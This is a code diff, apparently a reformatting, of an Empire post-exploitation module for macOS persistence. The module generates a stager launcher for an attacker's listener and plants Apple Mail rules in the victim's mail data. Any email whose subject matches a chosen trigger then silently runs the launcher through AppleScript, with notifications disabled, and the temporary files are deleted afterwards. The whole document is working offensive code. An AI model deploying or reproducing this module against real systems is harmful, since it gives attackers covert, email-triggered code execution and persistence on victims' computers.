@@ -1,39 +1,61 @@
-from builtins import object
-from builtins import range
-from builtins import str
+from builtins import object, range, str
 from random import choice
 from string import ascii_uppercase
 from time import time
-from typing import Dict, Tuple, Optional
+from typing import Dict, Optional, Tuple
 
 from empire.server.common.module_models import PydanticModule
 
 
 class Module(object):
     @staticmethod
-    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = "") -> Tuple[Optional[str], Optional[str]]:
+    def generate(
+        main_menu,
+        module: PydanticModule,
+        params: Dict,
+        obfuscate: bool = False,
+        obfuscation_command: str = "",
+    ) -> Tuple[Optional[str], Optional[str]]:
 
-        rule_name = params['RuleName']
-        trigger = params['Trigger']
-        listener_name = params['Listener']
-        user_agent = params['UserAgent']
-        safe_checks = params['SafeChecks']
-        launcher = main_menu.stagers.generate_launcher(listener_name, language='python', userAgent=user_agent, safeChecks=safe_checks)
+        rule_name = params["RuleName"]
+        trigger = params["Trigger"]
+        listener_name = params["Listener"]
+        user_agent = params["UserAgent"]
+        safe_checks = params["SafeChecks"]
+        launcher = main_menu.stagers.generate_launcher(
+            listener_name,
+            language="python",
+            userAgent=user_agent,
+            safeChecks=safe_checks,
+        )
         launcher = launcher.replace('"', '\\"')
         launcher = launcher.replace('"', '\\"')
-        launcher = "do shell script \"%s\"" % (launcher)
-        hex = '0123456789ABCDEF'
+        launcher = 'do shell script "%s"' % (launcher)
+        hex = "0123456789ABCDEF"
+
         def UUID():
-            return ''.join([choice(hex) for x in range(8)]) + "-" + ''.join(
-                [choice(hex) for x in range(4)]) + "-" + ''.join([choice(hex) for x in range(4)]) + "-" + ''.join(
-                [choice(hex) for x in range(4)]) + "-" + ''.join([choice(hex) for x in range(12)])
+            return (
+                "".join([choice(hex) for x in range(8)])
+                + "-"
+                + "".join([choice(hex) for x in range(4)])
+                + "-"
+                + "".join([choice(hex) for x in range(4)])
+                + "-"
+                + "".join([choice(hex) for x in range(4)])
+                + "-"
+                + "".join([choice(hex) for x in range(12)])
+            )
+
         criterion_unique_id = UUID()
         RuleId = UUID()
         time_stamp = str(int(time()))[0:9]
-        synced_rules = "/tmp/" + ''.join(choice(ascii_uppercase) for i in range(12))
-        rules_active_state = "/tmp/" + ''.join(choice(ascii_uppercase) for i in range(12))
-        apple_script = ''.join(choice(ascii_uppercase) for i in range(12)) + ".scpt"
-        plist = '''<?xml version="1.0" encoding="UTF-8"?>
+        synced_rules = "/tmp/" + "".join(choice(ascii_uppercase) for i in range(12))
+        rules_active_state = "/tmp/" + "".join(
+            choice(ascii_uppercase) for i in range(12)
+        )
+        apple_script = "".join(choice(ascii_uppercase) for i in range(12)) + ".scpt"
+        plist = (
+            """<?xml version="1.0" encoding="UTF-8"?>
         <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
         <plist version="1.0">
         <array>
@@ -41,16 +63,22 @@ class Module(object):
         		<key>AllCriteriaMustBeSatisfied</key>
         		<string>NO</string>
         		<key>AppleScript</key>
-        		<string>''' + apple_script + '''</string>
+        		<string>"""
+            + apple_script
+            + """</string>
         		<key>AutoResponseType</key>
         		<integer>0</integer>
         		<key>Criteria</key>
         		<array>
         			<dict>
         				<key>CriterionUniqueId</key>
-        				<string>''' + criterion_unique_id + '''</string>
+        				<string>"""
+            + criterion_unique_id
+            + """</string>
         				<key>Expression</key>
-        				<string>''' + str(trigger) + '''</string>
+        				<string>"""
+            + str(trigger)
+            + """</string>
         				<key>Header</key>
         				<string>Subject</string>
         			</dict>
@@ -66,9 +94,13 @@ class Module(object):
         		<key>NotifyUser</key>
         		<string>NO</string>
         		<key>RuleId</key>
-        		<string>''' + RuleId + '''</string>
+        		<string>"""
+            + RuleId
+            + """</string>
         		<key>RuleName</key>
-        		<string>''' + str(rule_name) + '''</string>
+        		<string>"""
+            + str(rule_name)
+            + """</string>
         		<key>SendNotification</key>
         		<string>NO</string>
         		<key>ShouldCopyMessage</key>
@@ -76,21 +108,28 @@ class Module(object):
         		<key>ShouldTransferMessage</key>
         		<string>NO</string>
         		<key>TimeStamp</key>
-        		<integer>''' + time_stamp + '''</integer>
+        		<integer>"""
+            + time_stamp
+            + """</integer>
         		<key>Version</key>
         		<integer>1</integer>
         	</dict>
         </array>
-        </plist>'''
-        plist2 = '''<?xml version="1.0" encoding="UTF-8"?>
+        </plist>"""
+        )
+        plist2 = (
+            """<?xml version="1.0" encoding="UTF-8"?>
         <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
         <plist version="1.0">
         <dict>
-        	<key>''' + RuleId + '''</key>
+        	<key>"""
+            + RuleId
+            + """</key>
         	<true/>
         </dict>
         </plist>
-        	'''
+        	"""
+        )
         script = """
 import os
 home =  os.getenv("HOME")
@@ -148,6 +187,13 @@ else:
 os.system("/usr/libexec/PlistBuddy -c 'Merge " + RulesActiveState + "' "+ home + "/Library/Mail/" + version + "/MailData/RulesActiveState.plist")
 os.system("rm " + SyncedRules)
 os.system("rm " + RulesActiveState)
-        """ % (apple_script, synced_rules, rules_active_state, plist, plist2, launcher)
+        """ % (
+            apple_script,
+            synced_rules,
+            rules_active_state,
+            plist,
+            plist2,
+            launcher,
+        )
 
         return script
